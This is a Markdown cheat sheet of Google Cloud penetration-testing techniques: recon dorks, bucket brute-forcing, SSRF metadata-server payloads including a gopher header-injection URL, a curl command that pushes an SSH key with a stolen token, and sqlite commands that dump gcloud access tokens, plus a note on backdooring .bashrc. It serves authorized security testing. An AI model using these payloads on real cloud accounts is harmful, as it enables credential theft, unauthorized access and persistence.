# GCP Pentest : Tools and Techniques

### MITRE Att&ck : Cloud Matrix
- https://attack.mitre.org/matrices/enterprise/cloud/

### GCP - Misc

### GCP - 101
Google Cloud Platform resource hierarchy.
- https://cloud.google.com/resource-manager/docs/cloud-platform-resource-hierarchy

```
Organization
--> Folders
  --> Projects
    --> Resources
```

#### Organization
> The Organization resource is the root node in the Google Cloud resource hierarchy and is the hierarchical super node of projects.

#### Folders
> Folders are nodes in the Cloud Platform Resource Hierarchy. A folder can contain projects, other folders, or a combination of both. Organizations can use folders to group projects under the organization node in a hierarchy.

#### Project
> A GCP Project is basically a collection of various GCP services such as compute instances, storage buckets, Cloud run containers, etc. that are grouped together since they serve one application or project in the corporate terminology.

<img src="https://cloud.google.com/resource-manager/img/cloud-hierarchy.svg" alt="gcphierarchy" width="500"/>

#### GCP Control Plane
GCP control plane can be defined as a set o APIs that allows a GCP administrator or an IAM user to start, monitor and stop various services that run within GCP environment.  

#### Secrets to GCP Control Plane
##### Owner (username/password)
This is the first account used to sign up for GCP. 
--> Root level credential, owner credential for the GCP project

##### GCP IAM user
GCP Identity and Access Management (IAM) allows to create unique IAM user identities. IAM accounts are restricted by default in terms of the privileges they are provided with.

##### Service account
Special type of Google account intended to represent a non-human user that need to authenticate and be authorized to access data in Google APIs.  

--> **Service account key files** : JSON files containing the private key of the service account. Used by application to access various other GCP resources.

##### OAuth 2.0 Client credentials
In some case we would not use service account but user credentials to access resources on behalf of an end user for example, in this case we will use OAuth 2.0 client credentials.  

--> A client token will be obtained after the user grants permissions and this allows an application to access project resources under that user's account. ([OAuth Token Hijacking](https://www.youtube.com/watch?v=motZouxkVZ0))

##### API Keys
API keys are simple encrypted strings that can be used when calling certain APIs that don't need to access private user data.   

API Key are mostly used to track API requests associated with the project for quota and billing.

**Threat regarding GCP**  
- Owner account
- IAM credentials
- Service account key files

3 Types of IAM roles:
- Basic Roles : Existing roles prior to the introduction of IAM
	+ Owner
	+ Editor
	+ Viewer
	
- Predefined Roles : Granular access for specific service
	+ [Created by Google](https://cloud.google.com/iam/docs/understanding-roles#predefined_roles)

- Custom Roles : Ganular access to user-specified list of permissions.

**Checking permissions**
- [IAM permissions](https://cloud.google.com/iam/docs/permissions-reference)
- [Predefined roles](https://cloud.google.com/iam/docs/understanding-roles#predefined_roles)
- [Product specific IAM roles](https://cloud.google.com/iam/docs/understanding-roles#product_specific_documentation)

#### GCP Access
##### Web console
- https://console.cloud.google.com  
--> Management UI (classical admin console interface with GUI accessible through browser)

##### Gcloud CLI
- https://cloud.google.com/sdk/docs/cheatsheet
--> Google Cloud CLI is a set of tools to create and manage Google Cloud resources.

Through click on the web console or gcloud CLI you will directly talk to Controle Plan APIs (Restfull).

## GCP - Analyse
### Scoutsuite

### Hayat
- https://github.com/DenizParlak/hayat

Hayat is a auditing & hardening script for Google Cloud Platform services such as:

- Identity & Access Management
- Logging and monitoring
- Networking
- Virtual Machines
- Storage
- Cloud SQL Instances
- Kubernetes Clusters

### GCP-IAM-Collector
Python scripts for collecting and visualising Google Cloud Platform IAM permissions.  

GCP IAM graph is created using vis.js and it's static HTML page, see example interactive graph.  

- https://github.com/marcin-kolda/gcp-iam-collector

### GCP Firewall enum
Parse gcloud output to enumerate compute instances with network ports exposed to the Internet.


- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_firewall_enum

### GCP_enum
A simple bash script to enumerate Google Cloud Platform environments. The script utilizes gcloud, gsutil, and curl commands to collect information from various GCP APIs. The commands will use the current "Application Default Credentials".  

- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_enum

### GCP K8s enum
This tool analyzes the output of several gcloud commands to determine services exposed to the public Internet via Google Kubernetes Engine (GKE) Ingress.  

- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_k8s_enum


## GCP â€“ Enumeration / Recon

### Open buckets / CloudRun / Functions
- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_misc.git

### GCP - Azure - AWS IP ranges	
Python script performing the necessary actions for collecting the latest IP addresses used by Amazon Web Services, Google Compute, and Microsoft Azure.  

- https://github.com/chrismaddalena/UsefulScripts/blob/master/UpdateCloudIPs.py

### Shodan / Censys
Look for strings within Shodan related to GCP environments:
- storage.gogole.apis.com
- 

### GCP Dorks
- Identifying GCE instances that might have JSON file:
```
site:bc.googleusercontent.com ext:json intext:url
```
--> If a website is hosted in this GCE, add the IP before **bc**.
```
https://33.xx.xx.xx.bc.googleusercontent.com/
```
--> Automated technique:
SearchDiggity (Credits to : BishopFox)
- https://resources.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/

<img src="https://resources.bishopfox.com/wp-content/uploads/2013/07/SearchDiggity-ToolList-29May2014v2.png" alt="firebasedorks" width="500"/>


- Identifying GCP Storage.
	- https://bucket_name.storage.googleapis.com
	- https://storage.googleapis.com/bucket_name
```
site:storage.googleapis.com

```
--> Automated technique: [GCPBucketBrute](https://github.com/lutzenfried/OffensiveCloud/blob/main/GCP/GCP%20Pentest%20Cloud%20-%20Resources.md#gcp--gcpbucketbrute)

- Identifying App Engine
```
site:appsport.com inurl:admin ext:html
```

- Identifying Cloud run
```
site:run.app inurl:admin
```

- Identifying Cloud FireStore (NoSQL database)
```
site:firebaseio.com inurl:admin
```
<img src="./Images/dork_firebase.png" alt="firebasedorks" width="500"/>

- Identifying Cloud Functions
```
site:cloudfunctions.net inurl:admin
```

##### Dorks automation techniques:  
1. SearchDiggity
- https://resources.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/  


2. Dork-cli
- https://github.com/jgor/dork-cli

In order to use this program you need to configure at a minimum two settings: a Google API key and a custom search engine id.

-  
### GCP Storage - GreyHatWarfare
Finding GCP Storage resources such as buckets:
- https://buckets.grayhatwarfare.com/

### GCP Storage misc locations
- Github, other repo technology to find storage endpoint
- Mobile app of the company
- Wayback machine (enum_wayback module MSF)

### Accessing Onjects
- https://storage.googleapis.com/its_all_in_the_cloud/object001.jpg
	- storage.googleapis.com -> GCP
	- its_all_in_the_cloud -> Globally unique bucket name
	- object001.jpg -> Object Name

### Git / Repo secret parsers
Public Repository Search for Credentials/Access Keys/Configuration Files  
```
gitleaks (https://github.com/zricethezav/gitleaks)
trufflehog (https://github.com/trufflesecurity/truffleHog)
git-secrets (https://github.com/awslabs/git-secrets)
shhgit (https://github.com/eth0izzle/shhgit)
gitrob (https://github.com/michenriksen/gitrob)
```

--> Within Github search for the following terms in company profile :
- storage.googleapis.com

### Cloud_Enum
Tool to search for public resources in AWS, Azure, and GCP

- https://github.com/initstring/cloud_enum
```
python3 cloud_enum.py -k <name-to-search>
```
## GCP - Authenticated enumeration
This script allows pentesters to validate which cloud tokens (API keys, OAuth tokens and more) can access which cloud service.  

- https://github.com/NotSoSecure/cloud-service-enum/
- https://notsosecure.com/cloud-services-enumeration-aws-azure-and-gcp


## GCP - Exploitation

### OAuth Phishing (Illicit Grant Attack)
illicit grant attacks use the actual OAuth authentication/authorization flows in order to obtain the OAuth session tokens. This has the advantage of bypassing MFA authentication, with permanent or nearly indefinite access since the OAuth tokens can be continually refreshed in most cases using **refresh token**  

- https://www.youtube.com/watch?v=motZouxkVZ0

<img src="./Images/oauth_flow.png" alt="firebasedorks" width="800"/>

In case

### Exploiting shared images

### GCP : GCPBucketBrute
Google Storage buckets, determine what access you have to them, and determine if they can be privilege escalated.  

- https://github.com/RhinoSecurityLabs/GCPBucketBrute

This tool can be used using unauthenticated/authenticated approach.

If credentials --> the majority of enumeration will still be performed while unauthenticated, but for any bucket that is discovered via unauthenticated enumeration, it will attempt to enumerate the bucket permissions using the TestIamPermissions API with the supplied credentials.

```
python3 gcpbucketbrute.py -k companyName -u

```

### Brute force file within bucket
If the bucket is configured correctly and file listing is not possible, that does not mean the files are protected correctly within the bucket. It is possible that the owner of the bucket forgot to set the permissions on sensitive files uploaded to that bucket.

- Use [enumFilesStorage.py](https://github.com/lutzenfried/OffensiveCloud/blob/main/GCP/Scripts/enumFilesStorage.py)

```
# python3 enumFilesStorage.py cdn_test 16

Not Found : index.php
Not Found : search.php
Not Found : login.php
============> Valid file found : a.log
Not Found : cron.php
Not Found : LICENSE.txt
Not Found : INSTALL.pgsql.txt
Not Found : register.php
Not Found : memberlist.php
Not Found : UPGRADE.txt
```

#### Subdomain takeover
Subdomain takeover can occur within GCP environment. For example through bucket and DNS entry misconfiguration.  

In case a DNS entry still points to the subdomain to that GCP bucket, but the bucket has been deleted, an attacker woul be able to **create** a new bucket with the same name under hist attacker's GCP account.  

This would provide capability to attacker to create malicious JavaScript, or served any content using victim organization identity.  

```
e.g. foo.example.com ---DNS--entry--(CNAME)---> foo.storage.googleapis.com
```
##### Subdomain takeover technic
1. Enumerating subdomain and maps where subdomain point to.
- https://github.com/nahamsec/HostileSubBruteforcer
- https://github.com/aboul3la/Sublist3r
- Certificate transparency https://crt.sh/?q=company.com
- httpstatus.io to verify status code

2. 

### GCP : Server Side Request Forgery (SSRF)
v1 and v1beta1 depecation : https://cloud.google.com/compute/docs/deprecations/v0.1-v1beta1-metadata-server

--> v1beta1 deprecated but sometimes works. 

- metadata.google.internal : 169.254.169.254

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

- Beta does NOT require a header atm (but normally deprecated)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

- Use gopher SSRF to add the required headers
- Metadata-Flavor: Google
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

##### Accessing interesting files
- **SSH Public Key** : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
- **Get Access Token** : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
- **Kubernetes Key** : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=jso

##### SSRF Exploitation scenario:
1. Extract the token
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

2. Check the scope of the token
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

3. Now push the SSH key
```
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

### Validate a User Tokens
Query the Google API to validate and  determine token scope.
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ywgfhdb3dyx-xj0_EofjsfFks53kdDF
```
- [gcp_check_token.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_check_token.py)
- [gcp_get_token_gce_header.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_header.py)
- [gcp_get_token_gce_v1beta1.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_v1beta1.py)
Check access token is valid and it's scope via googleapis.com

###  Exploiting Kubernetes (K8s-GKE)
**Scenario** : You exploit a webapp and get command execution.  

#### Validate you are in container env
Check for environment variables for *kupepods* process
```
/bin/cat /proc/1/cgroup
```

If Docker in use, check for *.dockerenv* at /
```
ls -lah /
```

Check process list on the box (pid 1 is not **init** or **launchd**)
```
ps -aux

```

#### Accessing secrets
By default, a container in the Kubernetes cluster will hold a service account token within its file system. If attackers find that token, they can use it to move laterally, or depending on the privilege of the service account, they can escalate its privilege to compromise the entire cluster environment.  
```
/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/token
```

Access token via metadata from compromised nodes.
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```



## GCP - Lateral movement / pivoting
### SharpCloud
SharpCloud is a simple C# utility for checking for the existence of credential files related to Amazon Web Services, Microsoft Azure, and Google Compute.

##### Searches all user profiles for credentials related to Google Compute.
```
SharpCloud.exe gcloud
```

- https://github.com/chrismaddalena/SharpCloud

### From compromised node
If access to a container, a compromised pode can talk to the kubelet on ports:
- TCP 10250
- TCP 10255

--> Checking if port are accessible: E.g for port 10250  
```
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex(('192.168.0.10',10250))
if result == 0:
	print ("Port is open")
else:
	print ("Port is not open")
sock.close()
```

--> Listing pods
```
import urllib

response = urllib.urlopen('http://10.128.0.10:10255/pods')
print("Response : ", response)
print("URL : ", response.geturl())

headers = response.info()
print (headers)

data = response.read()
print (data^)
```

#### Container Breakout
If you land on a container that is not configured with default settings, you may need to escalate your privileges or escape from it in order to gain access to the underlying host OS.

- Docker Breakout (HackTricks)
- Container Escape Using Kernel Exploitation (CyberArk)
- How I Hacked Play-with-Docker (CyberArk)
- CVE-2016-5195
- CVE-2019â€“5736
- CVE-2019â€“14271
- CVE-2020â€“15257

## GCP - Privilege Escalation

#### GCP CloudBuild
A user with permissions to start a new build with Cloud Build can gain access to the Cloud Build Service Account and abuse it for more access to the environment.  

To exploit this as a user in GCP, we only need one IAM permission granted to the user in question:  

- cloudbuild.builds.create

--> https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/
--> https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py

## GCP - Persistence
#### Accessing tokens
In case you compromise a laptop, Mac, or server with Gcloud CLI installed.  

GCP tokens are stored within an SQL Lite database.  

- MAC Accessing tokens
```
ls /Users/bryce/.config/gcloud/access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
- Linux Accessing tokens
```
ls /home/jdoe/.config/gcloud/access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
- Windows Accessing tokens
```
dir C:\Users\username\AppData\Roaming\gcloud\access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
Additionnally you can access Scope every token using **credentials.db** database.
```
sqlite3 credentials.db "select * from credentials
```
#### Browser Cookies
--> **If Root Access**-> Export (Safari,Chrome,Firefox,etc...)

- Mitre Att&ck technique - [T1539](https://attack.mitre.org/techniques/T1539/) - Steal Web Session Cookie
- Mitre Att&ck technique - [T1550](https://attack.mitre.org/techniques/T1550/) - Sub-Technique [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004/)

- https://embracethered.com/blog/posts/passthecookie/
- https://maxchadwick.xyz/blog/exporting-your-browser-cookies-on-a-mac/

--> **No Root Access**
- https://github.com/defaultnamehere/cookie_crimes

<img src="./Images/cookie_browser.png" alt="cookies" width="600"/>

#### Cloud Shell Persistence
Using Cloud Shell online, the machine comes pre-installed with the Google Cloud SDK but also with **5GB** HOME directory which will **persist** across sessions.

--> Backdoor the **.bashrc** file

## GCP - Resources

#### GCP - Security - HackTricks
- https://book.hacktricks.xyz/cloud-security/gcp-security

#### GCP - Pentestbook
- https://pentestbook.six2dez.com/enumeration/cloud/gcp

#### Hacking GCP - Richard Knowell
- https://www.amazon.ca/Advanced-Penetration-Testing-Hacking-Platform/dp/B08P1H4KLZ

#### Oauth authorization/device flow
- https://www.netskope.com/fr/blog/new-phishing-attacks-exploiting-oauth-authorization-flows-part-1

#### Training - Vulnerable Cloud environments
- Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat
- SadCloud - https://github.com/nccgroup/sadcloud
- Flaws Cloud - http://flaws.cloud
- Thunder CTF - http://thunder-ctf.cloud